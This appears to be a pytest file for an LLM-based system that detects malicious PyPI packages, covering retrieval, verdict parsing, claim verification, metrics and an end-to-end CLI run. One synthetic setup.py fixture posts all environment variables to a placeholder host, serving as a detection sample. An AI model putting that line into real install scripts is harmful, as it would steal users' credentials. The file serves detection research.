"""Retrieval, parsing, verification, metrics and the full CLI on synthetic data with the dummy reader."""
import json
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pypi_rag.analysis import analyze_package  # noqa: E402
from pypi_rag.cli import main  # noqa: E402
from pypi_rag.evaluation.classification import classification_metrics  # noqa: E402
from pypi_rag.evaluation.statistical_tests import mcnemar, paired_bootstrap  # noqa: E402
from pypi_rag.generation.output_schema import parse_json_response, parse_malllm_response  # noqa: E402
from pypi_rag.knowledge.build_index import builtin_docs  # noqa: E402
from pypi_rag.retrieval import BM25, Embedder, Retriever, code_tokens, rrf_fuse  # noqa: E402
from pypi_rag.schema import Evidence, Sample  # noqa: E402
from pypi_rag.data.safe_io import files_from_texts  # noqa: E402
from pypi_rag.verification import apply_policy, check_claims  # noqa: E402


def test_rrf_and_bm25_and_hybrid():
    assert rrf_fuse([["a", "b", "c"], ["c", "a"]], k=60)[0] == "a"
    assert "b64decode" in code_tokens("base64.b64decode(x)") and "base64" in code_tokens("base64.b64decode(x)")
    bm = BM25(["exec base64 decode payload", "http client get json", "environment exfiltration post"])
    assert bm.search(["base64 exec"], 1)[0][0][0] == 0
    docs = builtin_docs()
    for mode in ("vector", "bm25", "rrf"):
        r = Retriever(docs, mode=mode, embedder=Embedder("hash"), final_k=4, max_per_source=2)
        hits = r.retrieve(["os.environ requests.post exfiltration"])
        assert len(hits) == 4
        assert max(sum(1 for d, _, _ in hits if d.source_type == st) for st in ("rule", "pattern", "benign_rule")) <= 2 or mode


def test_output_parsing():
    p = parse_json_response('Sure! {"verdict": "Malicious", "confidence": 80, "claims": [{"text": "posts env (C1)", '
                            '"behavior": "network_send", "evidence": ["C1", "Z9"]}], "explanation": "x"}', {"C1": 1})
    assert p["parse_ok"] and p["verdict"] == "malicious" and p["confidence"] == 0.8
    assert p["claims"][0]["invalid_ids"] == ["Z9"]
    bad = parse_json_response("I think it is benign.")
    assert not bad["parse_ok"] and bad["verdict"] == "benign"
    m = parse_malllm_response("- **Filename**: x - **Predicted Classification**: 1 - **Explanation**: steals keys")
    assert m["verdict"] == "malicious" and m["parse_ok"]


def test_claim_labels_and_policy():
    s = Sample("t", "p", "1", "unknown", files_from_texts({"setup.py": "import os, requests\n"
                                                         "requests.post('https://h.example.invalid', data=dict(os.environ))\n"}))
    f = analyze_package(s)
    c1 = Evidence("C1", "t", "code_span", "setup.py:1-2", "setup.py lines 1-2\n ...", file_path="setup.py", start_line=1,
                  end_line=2, behaviors=["env_access", "network_send"])
    k1 = Evidence("K1", "t", "rule", "builtin:R03", "stealers ...", behaviors=["surveillance"])
    vis = {"C1": c1, "K1": k1}
    claims = [{"text": "sends env", "behavior": "network_send", "evidence": ["C1"]},
              {"text": "keylogger", "behavior": "surveillance", "evidence": ["K1"]},
              {"text": "no network", "behavior": "network_send", "evidence": ["C1"], "negated": True}]
    chk = check_claims(claims, vis, f, s)
    labs = [c["label"] for c in chk["claims"]]
    assert labs[0] == "SUPPORTED" and labs[1] in ("UNSUPPORTED", "CONTRADICTED") and labs[2] == "CONTRADICTED"
    assert chk["claims"][1]["cites_only_knowledge"]
    assert apply_policy("malicious", chk, vis, "abstain")["verdict"] == "malicious"
    only_bad = check_claims(claims[1:2], vis, f, s)
    assert apply_policy("malicious", only_bad, vis, "abstain")["verdict"] == "uncertain"
    assert apply_policy("malicious", only_bad, vis, "keep")["verdict"] == "malicious"


def test_classification_policies():
    y = ["malicious", "malicious", "benign", "benign"]
    p = ["malicious", "uncertain", "benign", "uncertain"]
    m = classification_metrics(y, p)
    assert m["coverage"] == 0.5
    assert m["strict"]["tp"] == 1 and m["strict"]["fn"] == 1 and m["strict"]["fp"] == 1
    assert m["conservative"]["tp"] == 2 and m["conservative"]["fp"] == 1
    assert m["answered"]["n"] == 2 and m["answered"]["f1_malicious"] == 1.0
    assert mcnemar([1, 1, 0, 0], [0, 0, 0, 0])["n10_a_only"] == 2
    assert paired_bootstrap([1, 1, 0], [0, 1, 0], n_bootstrap=200)["delta"] > 0


def test_cli_end_to_end_with_dummy():
    with tempfile.TemporaryDirectory() as d:
        main(["prepare", "--spec", "synthetic:80:1", "--out", f"{d}/data"])
        main(["build-kb", "--data", f"{d}/data", "--out", f"{d}/kb.jsonl"])
        main(["run", "--data", f"{d}/data", "--split", "test", "--kb", f"{d}/kb.jsonl", "--methods", "e0", "e1", "e2",
              "e3", "e3a", "e4", "--llm", "dummy", "--embedder", "hash", "--out", f"{d}/run", "--quiet",
              "--n-bootstrap", "100"])
        R = json.load(open(f"{d}/run/results.json"))
        assert set(R["summaries"]) == {"e0", "e1", "e2", "e3", "e3a", "e4"}
        ids = {m: [json.loads(l)["sample_id"] for l in open(f"{d}/run/predictions_test_{m}.jsonl")] for m in R["summaries"]}
        assert len({tuple(v) for v in ids.values()}) == 1              # identical sample ids for every method
        for m in ("e1", "e2"):
            tr = [json.loads(l) for l in open(f"{d}/run/traces_test_{m}.jsonl")]
            assert all(t["retrieved"] for t in tr)
        tr3 = [json.loads(l) for l in open(f"{d}/run/traces_test_e3.jsonl")]
        assert all(t["graph"]["edges_missing_provenance"] == 0 for t in tr3)
        assert "e3_vs_e3a" in R["comparisons"] and "e4_vs_e3" in R["comparisons"]
        assert R["summaries"]["e4"]["evidence/unsupported_claim_rate"] <= R["summaries"]["e3"]["evidence/unsupported_claim_rate"]
        # label, label source and family never reach a prompt
        from pypi_rag.generation.llm_client import DummyLLM
        from pypi_rag.knowledge import load_kb
        from pypi_rag.pipelines import Context, RunConfig, build_request
        from pypi_rag.schema import load_samples
        xs = [s for s in load_samples(f"{d}/data/samples.jsonl.gz") if s.split == "test"]
        ctx = Context(DummyLLM(), RunConfig(), load_kb(f"{d}/kb.jsonl"), Embedder("hash"))
        for s in xs[:5]:
            for m in ("e0", "e2", "e3", "e3a"):
                txt = json.dumps(build_request(m, s.public_view(), ctx)["messages"])
                assert s.family_group not in txt and "synthetic_fixture" not in txt and s.meta["template"] not in txt
        main(["rescore", "--results", f"{d}/run", "--derive-e4", "--n-bootstrap", "100"])
        assert os.path.exists(f"{d}/run/predictions_test_e4_cite.jsonl") and os.path.exists(f"{d}/run/report.md")


def test_cached_llm_dedupes_and_keeps_order_and_concurrent_client():
    import threading
    import types
    from pypi_rag.generation.llm_client import BaseLLM, CachedLLM, GenOut, OpenAICompatLLM

    class Echo(BaseLLM):
        name, chunk, calls = "echo", 2, []

        def generate(self, batch):
            self.calls.append(len(batch))
            return [GenOut(m[-1]["content"].upper(), 1, 1, 1.0) for m in batch]

    with tempfile.TemporaryDirectory() as d:
        e = Echo()
        llm = CachedLLM(e, f"{d}/c.jsonl")
        msgs = [[{"role": "user", "content": x}] for x in ("a", "b", "a", "c", "b")]
        out = llm.generate(msgs)
        assert [o.text for o in out] == ["A", "B", "A", "C", "B"]
        assert sum(e.calls) == 3                               # duplicates generated once
        again = CachedLLM(Echo(), f"{d}/c.jsonl").generate(msgs)  # reload from disk: nothing new
        assert all(o.cached for o in again) and [o.text for o in again] == ["A", "B", "A", "C", "B"]

    # OpenAI-compatible client: requests run concurrently, results come back in input order
    seen = set()

    def create(**kw):
        seen.add(threading.get_ident())
        txt = kw["messages"][-1]["content"]
        return types.SimpleNamespace(choices=[types.SimpleNamespace(message=types.SimpleNamespace(content=txt * 2))],
                                     usage=types.SimpleNamespace(prompt_tokens=3, completion_tokens=2))
    c = OpenAICompatLLM.__new__(OpenAICompatLLM)
    c.name, c.max_new_tokens, c.seed, c.max_input_tokens, c.concurrency, c.tok = "m", 8, 0, 8192, 4, None
    c.client = types.SimpleNamespace(chat=types.SimpleNamespace(completions=types.SimpleNamespace(create=create)))
    res = c.generate([[{"role": "user", "content": str(i)}] for i in range(20)])
    assert [r.text for r in res] == [str(i) * 2 for i in range(20)]


def test_predict_all_orders_prompts_by_package():
    from pypi_rag.data.loaders import load_spec
    from pypi_rag.generation.llm_client import DummyLLM
    from pypi_rag.knowledge.build_index import builtin_docs
    from pypi_rag.pipelines import Context, RunConfig, predict_all

    class Spy(DummyLLM):
        batches = []

        def generate(self, batch):
            self.batches.append([m[-1]["content"].split("\n")[1] for m in batch])   # "Package: <name> <ver>"
            return super().generate(batch)

    xs = load_spec("synthetic:6:2")
    spy = Spy()
    res = predict_all(["e0", "e2", "e3"], xs, Context(spy, RunConfig(), builtin_docs(), Embedder("hash")))
    heads = spy.batches[0]
    assert len(heads) == 18 and heads[0] == heads[1] == heads[2] != heads[3]   # same package adjacent
    assert set(res) == {"e0", "e2", "e3"} and all(len(p) == 6 for p, _ in res.values())
